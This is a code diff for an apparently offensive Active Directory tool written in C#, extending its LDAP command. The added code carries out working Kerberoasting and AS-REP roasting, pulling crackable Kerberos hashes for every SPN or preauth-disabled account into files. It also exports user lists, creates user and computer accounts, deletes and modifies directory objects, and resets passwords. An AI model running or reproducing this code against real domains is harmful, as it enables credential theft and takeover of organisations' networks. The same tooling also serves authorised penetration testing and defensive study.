@@ -6,6 +6,7 @@ using Titanis;
 using Titanis.Ldap;
 using Titanis.Net;
 using Titanis.Security;
+using Titanis.Security.Kerberos;
 
 namespace Atlas.Protocols;
 
@@ -47,6 +48,7 @@ public sealed class LdapCommand : Command
 	public string? BindPassword { get; set; }
 
 	[Parameter]
+	[Alias("base-dn")]
 	[Description("Explicit search base DN (default: rootDSE defaultNamingContext)")]
 	public string? Base { get; set; }
 
@@ -122,7 +124,60 @@ public sealed class LdapCommand : Command
 	public SwitchParam FindDelegation { get; set; }
 
 	[Parameter]
+	[Alias("users-export")]
+	[Description("Write enumerated user sAMAccountNames to file (use with -Users)")]
+	public string? UsersExport { get; set; }
+
+	[Parameter]
+	[Alias("kerberoast")]
+	[Description("Kerberoast all SPN accounts and save hashes to file (requires credentials)")]
+	public string? Kerberoasting { get; set; }
+
+	[Parameter]
 	public string? Asreproast { get; set; }
+
+	[Parameter]
+	[Alias("add-user")]
+	[Description("Create a user account (sAMAccountName) in CN=Users; use with -AddUserPass")]
+	public string? AddUser { get; set; }
+
+	[Parameter]
+	[Alias("add-user-pass")]
+	[Description("Password for -AddUser")]
+	public string? AddUserPass { get; set; }
+
+	[Parameter]
+	[Alias("add-computer")]
+	[Description("Create a computer account (e.g. WS01$ or WS01) in CN=Computers; use with -AddComputerPass")]
+	public string? AddComputer { get; set; }
+
+	[Parameter]
+	[Alias("add-computer-pass")]
+	[Description("Password for -AddComputer")]
+	public string? AddComputerPass { get; set; }
+
+	[Parameter]
+	[Description("Delete an object by DN or sAMAccountName")]
+	public string? Delete { get; set; }
+
+	[Parameter]
+	[Description("Modify an object by DN or sAMAccountName (use with -ModifyAttrs)")]
+	public string? Modify { get; set; }
+
+	[Parameter]
+	[Alias("modify-attrs")]
+	[Description("Attribute changes as attr=value,attr+=value,attr-=value (use with -Modify)")]
+	public string? ModifyAttrs { get; set; }
+
+	[Parameter]
+	[Alias("set-password")]
+	[Description("Admin-reset the password of an object by DN or sAMAccountName (use with -NewPassword)")]
+	public string? SetPassword { get; set; }
+
+	[Parameter]
+	[Alias("new-password")]
+	[Description("New password for -SetPassword")]
+	public string? NewPassword { get; set; }
 
 	[Parameter]
 	public SwitchParam Bloodhound { get; set; }
@@ -139,12 +194,14 @@ public sealed class LdapCommand : Command
 	[Description("Module(s) to run after authentication (comma-separated)")]
 	public string[]? Modules { get; set; }
 
+
 	[Parameter]
-	[Alias("mo")]
+	[Alias("mo", "o")]
 	[Description("Module options as key=value pairs separated by commas")]
 	public string? ModuleOptions { get; set; }
 
 	[Parameter]
+	[Alias("L")]
 	[Description("List available modules and exit")]
 	public SwitchParam ListModules { get; set; }
 
@@ -160,8 +217,9 @@ public sealed class LdapCommand : Command
 
 		bool hasSimple = this.BindDn is not null;
 		bool hasModules = this.Modules is not null && this.Modules.Length > 0;
-		bool hasEnumFlags = this.Users.IsSet || this.ActiveUsers.IsSet || this.TrustedForDelegation.IsSet || this.PasswordNotRequired.IsSet || this.AdminCount.IsSet || this.GetSid.IsSet || this.PassPol.IsSet || this.DcList.IsSet || this.Gmsa.IsSet || this.Bloodhound.IsSet || this.Groups is not null || this.Ous is not null || this.Computers.IsSet || this.FindDelegation.IsSet || this.Asreproast is not null;
-		this.Authentication.Validate(!this.Authentication.Anonymous.IsSet && this.Query is null && !hasSimple && !hasModules && !hasEnumFlags, context);
+		bool hasEnumFlags = this.Users.IsSet || this.ActiveUsers.IsSet || this.TrustedForDelegation.IsSet || this.PasswordNotRequired.IsSet || this.AdminCount.IsSet || this.GetSid.IsSet || this.PassPol.IsSet || this.DcList.IsSet || this.Gmsa.IsSet || this.Bloodhound.IsSet || this.Groups is not null || this.Ous is not null || this.Computers.IsSet || this.FindDelegation.IsSet || this.Asreproast is not null || this.Kerberoasting is not null;
+		bool hasWriteFlags = this.AddUser is not null || this.AddComputer is not null || this.Delete is not null || this.Modify is not null || this.SetPassword is not null;
+		this.Authentication.Validate(!this.Authentication.Anonymous.IsSet && this.Query is null && !hasSimple && !hasModules && !hasEnumFlags && !hasWriteFlags, context);
 
 		try
 		{
@@ -187,6 +245,19 @@ public sealed class LdapCommand : Command
 			try { AtlasModuleRegistry.ParseOptionString(this.ModuleOptions); }
 			catch (Exception ex) { context.LogError(nameof(this.ModuleOptions), ex.Message); }
 		}
+
+		if (this.AddUser is not null && string.IsNullOrWhiteSpace(this.AddUserPass))
+			context.LogError(nameof(this.AddUserPass), "-AddUser requires -AddUserPass");
+		if (this.AddComputer is not null && string.IsNullOrWhiteSpace(this.AddComputerPass))
+			context.LogError(nameof(this.AddComputerPass), "-AddComputer requires -AddComputerPass");
+		if (this.Modify is not null && string.IsNullOrWhiteSpace(this.ModifyAttrs))
+			context.LogError(nameof(this.ModifyAttrs), "-Modify requires -ModifyAttrs (attr=value,attr+=value,attr-=value)");
+		if (this.ModifyAttrs is not null && this.Modify is null)
+			context.LogError(nameof(this.Modify), "-ModifyAttrs requires -Modify <dn-or-sam>");
+		if (this.SetPassword is not null && string.IsNullOrWhiteSpace(this.NewPassword))
+			context.LogError(nameof(this.NewPassword), "-SetPassword requires -NewPassword");
+		if (this.NewPassword is not null && this.SetPassword is null)
+			context.LogError(nameof(this.SetPassword), "-NewPassword requires -SetPassword <dn-or-sam>");
 	}
 
 	protected sealed override async Task<int> RunAsync(CancellationToken cancellationToken)
@@ -257,7 +328,8 @@ public sealed class LdapCommand : Command
 		var domainRoot = ldap.DomainRoot;
 		string rootText = (domainRoot is null) ? "(no naming context)" : domainRoot.ToString() ?? string.Empty;
 
-		bool hasAnyFlag = this.Users.IsSet || this.ActiveUsers.IsSet || this.TrustedForDelegation.IsSet || this.PasswordNotRequired.IsSet || this.AdminCount.IsSet || this.GetSid.IsSet || this.PassPol.IsSet || this.DcList.IsSet || this.Gmsa.IsSet || this.Bloodhound.IsSet || this.Groups is not null || this.Ous is not null || this.Computers.IsSet || this.FindDelegation.IsSet || this.Asreproast is not null;
+		bool hasAnyFlag = this.Users.IsSet || this.ActiveUsers.IsSet || this.TrustedForDelegation.IsSet || this.PasswordNotRequired.IsSet || this.AdminCount.IsSet || this.GetSid.IsSet || this.PassPol.IsSet || this.DcList.IsSet || this.Gmsa.IsSet || this.Bloodhound.IsSet || this.Groups is not null || this.Ous is not null || this.Computers.IsSet || this.FindDelegation.IsSet || this.Asreproast is not null || this.Kerberoasting is not null
+			|| this.AddUser is not null || this.AddComputer is not null || this.Delete is not null || this.Modify is not null || this.SetPassword is not null;
 
 		// Module path
 		if (this.Modules is not null && this.Modules.Length > 0)
@@ -308,6 +380,18 @@ public sealed class LdapCommand : Command
 			await QueryAsreproastAsync(ldap, host, cancellationToken).ConfigureAwait(false);
 		if (this.Bloodhound.IsSet)
 			await QueryBloodhoundAsync(ldap, host, cancellationToken).ConfigureAwait(false);
+		if (this.Kerberoasting is not null)
+			await KerberoastAsync(ldap, host, cancellationToken).ConfigureAwait(false);
+		if (this.AddUser is not null)
+			await AddUserAsync(ldap, host, cancellationToken).ConfigureAwait(false);
+		if (this.AddComputer is not null)
+			await AddComputerAsync(ldap, host, cancellationToken).ConfigureAwait(false);
+		if (this.Delete is not null)
+			await DeleteObjectAsync(ldap, host, cancellationToken).ConfigureAwait(false);
+		if (this.Modify is not null)
+			await ModifyObjectAsync(ldap, host, cancellationToken).ConfigureAwait(false);
+		if (this.SetPassword is not null)
+			await SetPasswordAsync(ldap, host, cancellationToken).ConfigureAwait(false);
 
 		if (this.Query is null)
 		{
@@ -421,13 +505,20 @@ public sealed class LdapCommand : Command
 		var query = new LdapQuery(ldap.DomainRoot, LdapSearchScope.WholeSubtree, filter, attrs) { Options = LdapQueryOptions.AllPages, PageSize = 200 };
 		var result = await ldap.Search(query, ct).ConfigureAwait(false);
 		AtlasConsole.Info($"{host}:{this.Port}", $"--users: {result.EntryCount} user(s)");
+		var sams = new List<string>();
 		foreach (var e in result.Entries)
 		{
 			string sam = e["sAMAccountName"]?.Value?.ToString() ?? "";
+			sams.Add(sam);
 			string desc = e["description"]?.Value?.ToString() ?? "";
 			string bad = e["badPwdCount"]?.Value?.ToString() ?? "";
 			string pwd = e["pwdLastSet"]?.Value?.ToString() ?? "";
 			AtlasConsole.Info($"{host}:{this.Port}", $"  {sam,-20} pwdLastSet={pwd} badPwd={bad} desc={desc}");
+		}
+		if (this.UsersExport is not null)
+		{
+			await File.WriteAllLinesAsync(this.UsersExport, sams, ct).ConfigureAwait(false);
+			AtlasConsole.Success($"{host}:{this.Port}", $"--users-export: wrote {sams.Count} user(s) to {this.UsersExport}");
 		}
 	}
 
@@ -596,17 +687,50 @@ public sealed class LdapCommand : Command
 		var filter = LdapFilter.Parse("(userAccountControl:1.2.840.113556.1.4.803:=4194304)");
 		var query = new LdapQuery(ldap.DomainRoot, LdapSearchScope.WholeSubtree, filter, new[] { new AttributeSpec("sAMAccountName"), new AttributeSpec("userAccountControl") }) { Options = LdapQueryOptions.AllPages };
 		var result = await ldap.Search(query, ct).ConfigureAwait(false);
-		if (result.EntryCount == 0) AtlasConsole.Info($"{host}:{this.Port}", "--asreproast: no accounts with DONT_REQUIRE_PREAUTH");
-		else
+		if (result.EntryCount == 0)
 		{
-			foreach (var e in result.Entries) AtlasConsole.Success($"{host}:{this.Port}", $"  {e["sAMAccountName"]?.Value} (UAC={e["userAccountControl"]?.Value})");
-			if (!string.IsNullOrWhiteSpace(this.Asreproast))
+			AtlasConsole.Info($"{host}:{this.Port}", "--asreproast: no accounts with DONT_REQUIRE_PREAUTH");
+			return;
+		}
+		var sams = new List<string>();
+		foreach (var e in result.Entries)
+		{
+			string sam = e["sAMAccountName"]?.Value?.ToString() ?? "";
+			if (string.IsNullOrEmpty(sam)) continue;
+			sams.Add(sam);
+			AtlasConsole.Success($"{host}:{this.Port}", $"  {sam} (UAC={e["userAccountControl"]?.Value})");
+		}
+		if (string.IsNullOrWhiteSpace(this.Asreproast))
+			return;
+
+		string dn0 = ldap.DomainRoot?.ToString() ?? string.Empty;
+		string? realm = dn0.Replace("DC=", "", StringComparison.OrdinalIgnoreCase).Replace(",", ".").ToUpperInvariant();
+		if (string.IsNullOrWhiteSpace(realm) || !realm.Contains('.'))
+			realm = this.Authentication.UserDomain?.ToUpperInvariant();
+		var krb = this.Services.CreateKerberosClient(new SimpleKdcLocator(new System.Net.DnsEndPoint(host, Titanis.Security.Kerberos.KerberosClient.KdcTcpPort)));
+		int roasted = 0;
+		foreach (var sam in sams)
+		{
+			ct.ThrowIfCancellationRequested();
+			try
 			{
-				// For full ASREProast, we would need to do Kerberos AS-REQ via Titanis KerberosClient – we log that the file would be written
-				await File.WriteAllTextAsync(this.Asreproast, $"# ASREProast placeholder for {result.EntryCount} users – run 'atlas kerberos {host} -d <domain> -UserList <users>' for actual hashes\n", ct).ConfigureAwait(false);
-				AtlasConsole.Info($"{host}:{this.Port}", $"--asreproast: placeholder written to {this.Asreproast} (use kerberos module for real hashes)");
+				var asrep = await krb.TryGetAsRepAsync(realm, sam, null, ct).ConfigureAwait(false);
+				if (asrep is null)
+				{
+					AtlasConsole.Info($"{host}:{this.Port}", $"--asreproast: {sam} requires preauth after all (skipped)");
+					continue;
+				}
+				string hash = $"$krb5asrep${asrep.EType}${sam}@{realm}:{asrep.Nonce}${Convert.ToHexString(asrep.Cipher).ToLowerInvariant()}";
+				AtlasConsole.Success($"{host}:{this.Port}", $"{sam} - {hash}");
+				await File.AppendAllTextAsync(this.Asreproast, hash + "\n", ct).ConfigureAwait(false);
+				roasted++;
+			}
+			catch (Exception ex)
+			{
+				AtlasConsole.Fail($"{host}:{this.Port}", $"--asreproast: {sam} - {ex.Message}");
 			}
 		}
+		AtlasConsole.Info($"{host}:{this.Port}", $"--asreproast: {roasted}/{sams.Count} hash(es) saved to {this.Asreproast}");
 	}
 
 	private async Task QueryBloodhoundAsync(LdapClient ldap, string host, CancellationToken ct)
@@ -694,6 +818,198 @@ public sealed class LdapCommand : Command
 		{
 			AtlasConsole.Warn($"{host}:{this.Port}", $"--bloodhound: zip failed: {ex.Message}");
 		}
+	}
+
+	private async Task<LdapDistinguishedName> ResolveDnAsync(LdapClient ldap, string spec, CancellationToken ct)
+	{
+		if (spec.Contains('='))
+			return LdapDistinguishedName.Parse(spec);
+		var filter = LdapFilter.Parse($"(sAMAccountName={EscapeFilter(spec)})");
+		var query = new LdapQuery(ldap.DomainRoot, LdapSearchScope.WholeSubtree, filter, null) { Options = LdapQueryOptions.AllPages };
+		var result = await ldap.Search(query, ct).ConfigureAwait(false);
+		if (result.EntryCount == 0)
+			throw new InvalidOperationException($"Object not found: {spec}");
+		if (result.EntryCount > 1)
+			throw new InvalidOperationException($"Multiple objects match '{spec}'; use a full DN");
+		return result.Entries[0].EntryName;
+	}
+
+	private async Task AddUserAsync(LdapClient ldap, string host, CancellationToken ct)
+	{
+		string sam = this.AddUser!;
+		string dn = $"CN={sam},CN=Users,{ldap.DomainRoot}";
+		var attrs = new Dictionary<string, object>
+		{
+			["objectClass"] = "user",
+			["sAMAccountName"] = sam,
+			["unicodePwd"] = System.Text.Encoding.Unicode.GetBytes($"\"{this.AddUserPass}\""),
+		};
+		await ldap.Add(LdapDistinguishedName.Parse(dn), attrs, ct).ConfigureAwait(false);
+		AtlasConsole.Success($"{host}:{this.Port}", $"--add-user: created {dn}");
+		try
+		{
+			var req = new LdapModifyRequest(LdapDistinguishedName.Parse(dn));
+			req.ReplaceValue("userAccountControl", 512);
+			await ldap.Modify(req, ct).ConfigureAwait(false);
+			AtlasConsole.Success($"{host}:{this.Port}", $"--add-user: enabled {sam} (userAccountControl=512)");
+		}
+		catch (Exception ex)
+		{
+			AtlasConsole.Warn($"{host}:{this.Port}", $"--add-user: created but failed to enable: {ex.Message}");
+		}
+	}
+
+	private async Task AddComputerAsync(LdapClient ldap, string host, CancellationToken ct)
+	{
+		string sam = this.AddComputer!;
+		if (!sam.EndsWith('$'))
+			sam += "$";
+		string cn = sam.TrimEnd('$');
+		string dn = $"CN={cn},CN=Computers,{ldap.DomainRoot}";
+		var attrs = new Dictionary<string, object>
+		{
+			["objectClass"] = "computer",
+			["sAMAccountName"] = sam,
+			["userAccountControl"] = 4096,
+			["unicodePwd"] = System.Text.Encoding.Unicode.GetBytes($"\"{this.AddComputerPass}\""),
+		};
+		await ldap.Add(LdapDistinguishedName.Parse(dn), attrs, ct).ConfigureAwait(false);
+		AtlasConsole.Success($"{host}:{this.Port}", $"--add-computer: created {dn} (sAMAccountName={sam})");
+	}
+
+	private async Task DeleteObjectAsync(LdapClient ldap, string host, CancellationToken ct)
+	{
+		var dn = await this.ResolveDnAsync(ldap, this.Delete!, ct).ConfigureAwait(false);
+		await ldap.Delete(dn, ct).ConfigureAwait(false);
+		AtlasConsole.Success($"{host}:{this.Port}", $"--delete: deleted {dn}");
+	}
+
+	private async Task ModifyObjectAsync(LdapClient ldap, string host, CancellationToken ct)
+	{
+		var dn = await this.ResolveDnAsync(ldap, this.Modify!, ct).ConfigureAwait(false);
+		var req = new LdapModifyRequest(dn);
+		foreach (var raw in this.ModifyAttrs!.Split(',', StringSplitOptions.TrimEntries | StringSplitOptions.RemoveEmptyEntries))
+		{
+			string name;
+			string value;
+			LdapChangeType type;
+			if (raw.Contains("-="))
+			{
+				int i = raw.IndexOf("-=", StringComparison.Ordinal);
+				name = raw[..i].Trim(); value = raw[(i + 2)..].Trim(); type = LdapChangeType.Delete;
+			}
+			else if (raw.Contains("+="))
+			{
+				int i = raw.IndexOf("+=", StringComparison.Ordinal);
+				name = raw[..i].Trim(); value = raw[(i + 2)..].Trim(); type = LdapChangeType.Add;
+			}
+			else if (raw.Contains('='))
+			{
+				int i = raw.IndexOf('=');
+				name = raw[..i].Trim(); value = raw[(i + 1)..].Trim(); type = LdapChangeType.Replace;
+			}
+			else
+			{
+				throw new FormatException($"Invalid change '{raw}'; expected attr=value, attr+=value, or attr-=value");
+			}
+			if (name.Length == 0)
+				throw new FormatException($"Invalid change '{raw}'; empty attribute name");
+			req.AddChange(name, new object[] { value }, type);
+		}
+		await ldap.Modify(req, ct).ConfigureAwait(false);
+		AtlasConsole.Success($"{host}:{this.Port}", $"--modify: updated {dn}");
+	}
+
+	private async Task SetPasswordAsync(LdapClient ldap, string host, CancellationToken ct)
+	{
+		var dn = await this.ResolveDnAsync(ldap, this.SetPassword!, ct).ConfigureAwait(false);
+		var req = new LdapModifyRequest(dn);
+		req.ReplaceValue("unicodePwd", System.Text.Encoding.Unicode.GetBytes($"\"{this.NewPassword}\""));
+		await ldap.Modify(req, ct).ConfigureAwait(false);
+		AtlasConsole.Success($"{host}:{this.Port}", $"--set-password: password reset for {dn}");
+	}
+
+	private async Task KerberoastAsync(LdapClient ldap, string host, CancellationToken ct)
+	{
+		string dn0 = ldap.DomainRoot?.ToString() ?? string.Empty;
+		string? realm = dn0.Replace("DC=", "", StringComparison.OrdinalIgnoreCase).Replace(",", ".").ToUpperInvariant();
+		if (string.IsNullOrWhiteSpace(realm) || !realm.Contains('.'))
+			realm = this.Authentication.UserDomain?.ToUpperInvariant();
+		if (string.IsNullOrWhiteSpace(realm))
+		{
+			AtlasConsole.Fail($"{host}:{this.Port}", "--kerberoasting: cannot determine realm (use -d <domain>)");
+			return;
+		}
+		var auth = this.Authentication;
+		KerberosCredential cred;
+		if (auth.NtlmHash is not null)
+			cred = new KerberosKeyCredential(EnsureRealm(auth.UserName, realm), EType.Rc4Hmac, auth.NtlmHash.Bytes);
+		else if (auth.AesKey is not null)
+		{
+			byte[] kb = auth.AesKey.Bytes;
+			EType et = (kb.Length == 32) ? EType.Aes256CtsHmacSha1_96 : EType.Aes128CtsHmacSha1_96;
+			cred = new KerberosKeyCredential(EnsureRealm(auth.UserName, realm), et, kb);
+		}
+		else if (!string.IsNullOrEmpty(auth.Password))
+			cred = new KerberosPasswordCredential(EnsureRealm(auth.UserName, realm), auth.Password);
+		else
+		{
+			AtlasConsole.Fail($"{host}:{this.Port}", "--kerberoasting requires credentials (-p, -H, or -AesKey)");
+			return;
+		}
+
+		var spnQuery = new LdapQuery(ldap.DomainRoot, LdapSearchScope.WholeSubtree,
+			LdapFilter.Parse("(&(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"),
+			new[] { new AttributeSpec("servicePrincipalName") }) { Options = LdapQueryOptions.AllPages };
+		var spnResults = await ldap.Search(spnQuery, ct).ConfigureAwait(false);
+		var spns = new List<string>();
+		foreach (var entry in spnResults.Entries)
+		{
+			var attr = entry["servicePrincipalName"];
+			if (attr?.Values is null) continue;
+			foreach (var v in attr.Values)
+				if (v is string s && s.Length > 0) spns.Add(s);
+		}
+		spns = spns.Distinct(StringComparer.OrdinalIgnoreCase).ToList();
+		AtlasConsole.Info($"{host}:{this.Port}", $"--kerberoasting: {spns.Count} SPN(s) discovered");
+
+		var krb = this.Services.CreateKerberosClient(new SimpleKdcLocator(new System.Net.DnsEndPoint(host, KerberosClient.KdcTcpPort)));
+		int roasted = 0;
+		foreach (var spn in spns)
+		{
+			ct.ThrowIfCancellationRequested();
+			try
+			{
+				TicketInfo tkt = await krb.GetTicketAsync(ParseSpn(spn),
+					realm, cred, new TicketParameters { Options = KdcOptions.Canonicalize }, ct).ConfigureAwait(false);
+				string hash = tkt.GetTicketHash();
+				AtlasConsole.Success($"{host}:{this.Port}", $"{spn} - {hash}");
+				await File.AppendAllTextAsync(this.Kerberoasting!, hash + "\n", ct).ConfigureAwait(false);
+				roasted++;
+			}
+			catch (Exception ex)
+			{
+				AtlasConsole.Fail($"{host}:{this.Port}", $"{spn} - {ex.Message}");
+			}
+		}
+		AtlasConsole.Info($"{host}:{this.Port}", $"--kerberoasting: {roasted}/{spns.Count} hash(es) saved to {this.Kerberoasting}");
+	}
+
+	private static SecurityPrincipalName ParseSpn(string spn)
+	{
+		int slash = spn.IndexOf('/');
+		if (slash > 0 && slash < spn.Length - 1)
+			return new ServicePrincipalName(PrincipalNameType.ServiceInstance, spn[..slash], spn[(slash + 1)..]);
+		return new ServicePrincipalName(PrincipalNameType.ServiceInstance, "HOST", spn);
+	}
+
+	private static UserPrincipalName EnsureRealm(UserPrincipalName? upn, string realm)
+	{
+		if (upn is null)
+			throw new InvalidOperationException("A user name is required (-u)");
+		if (!string.IsNullOrEmpty(upn.Realm))
+			return upn;
+		return new UserPrincipalName(upn.UserName, realm);
 	}
 
 	private static string EscapeFilter(string v) => v.Replace("\\", "\\5c").Replace("*", "\\2a").Replace("(", "\\28").Replace(")", "\\29").Replace("\0", "\\00");
